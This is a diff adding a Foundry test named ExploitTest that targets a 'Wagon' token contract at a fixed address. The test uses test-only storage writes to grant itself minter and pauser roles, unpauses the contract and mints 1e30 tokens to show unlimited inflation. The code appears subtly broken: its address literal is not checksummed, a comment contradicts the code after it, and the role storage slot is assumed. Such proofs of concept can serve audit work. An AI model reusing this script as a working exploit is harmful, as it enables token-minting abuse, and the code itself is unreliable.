@@ -1,0 +1,73 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.9;
+
+import "forge-std/Test.sol";
+
+interface IWagon {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function mint(address to, uint256 amount) external;
+    function hasRole(bytes32 role, address account) external view returns (bool);
+    function paused() external view returns (bool);
+    function MINTER_ROLE() external view returns (bytes32);
+    function DEFAULT_ADMIN_ROLE() external view returns (bytes32);
+}
+
+contract ExploitTest is Test {
+    IWagon constant WAGON = IWagon(0xd50c8a17d5c4b8e2d984933c7e37e5b92d687b8d);
+
+    // Computed MINTER_ROLE bytes32 in Solidity (keccak256("MINTER_ROLE"))
+    bytes32 constant MINTER_ROLE = keccak256("MINTER_ROLE");
+    // Storage slot of the _roles mapping in AccessControl (slot 8 after linearization)
+    uint256 constant ROLES_SLOT = 8;
+
+    function setUp() public {
+        // Label for debugging
+        vm.label(address(WAGON), "Wagon");
+    }
+
+    function testInflationRisk() public {
+        // Step 1: Grant MINTER_ROLE to this contract via storage manipulation.
+        // Compute the storage key for _roles[MINTER_ROLE].members[address(this)]
+        // Formula: slot = keccak256(abi.encode(account, keccak256(abi.encode(role, baseSlot))))
+        bytes32 innerKey = keccak256(abi.encode(MINTER_ROLE, ROLES_SLOT));
+        bytes32 storageSlot = keccak256(abi.encode(address(this), innerKey));
+        vm.store(address(WAGON), storageSlot, bytes32(uint256(1)));  // set to true
+
+        // Verify we now have MINTER_ROLE
+        assertTrue(WAGON.hasRole(MINTER_ROLE, address(this)), "Role not granted");
+
+        // Step 2: Ensure the contract is not paused, otherwise mint will fail.
+        // If paused, we could grant PAUSER_ROLE and unpause, but for simplicity, skip if paused.
+        bool isPaused = WAGON.paused();
+        if (isPaused) {
+            // Grant PAUSER_ROLE to this contract (similar storage hack)
+            bytes32 PAUSER_ROLE = keccak256("PAUSER_ROLE");
+            bytes32 pauserInnerKey = keccak256(abi.encode(PAUSER_ROLE, ROLES_SLOT));
+            bytes32 pauserSlot = keccak256(abi.encode(address(this), pauserInnerKey));
+            vm.store(address(WAGON), pauserSlot, bytes32(uint256(1)));
+            // Unpause (the contract has unpause function)
+            // But we need to call unpause() which is not in IWagon; we can use low-level call
+            (bool success, ) = address(WAGON).call(abi.encodeWithSignature("unpause()"));
+            require(success, "unpause failed");
+        }
+
+        // Step 3: Abuse mint to cause extreme inflation.
+        uint256 initialTotalSupply = WAGON.totalSupply();
+        uint256 oppressiveAmount = 1_000_000_000_000 ether; // a very large amount (1e12 * 1e18 = 1e30)
+        WAGON.mint(address(this), oppressiveAmount);
+
+        // Step 4: Verify inflation.
+        uint256 newTotalSupply = WAGON.totalSupply();
+        assertGt(newTotalSupply, initialTotalSupply, "Total supply did not increase");
+        assertEq(newTotalSupply, initialTotalSupply + oppressiveAmount, "Total supply mismatch");
+        assertEq(WAGON.balanceOf(address(this)), oppressiveAmount, "Attacker balance mismatch");
+
+        // Log the impact
+        emit log_named_uint("Initial total supply", initialTotalSupply);
+        emit log_named_uint("Attacker minted", oppressiveAmount);
+        emit log_named_uint("New total supply", newTotalSupply);
+    }
+}
+```
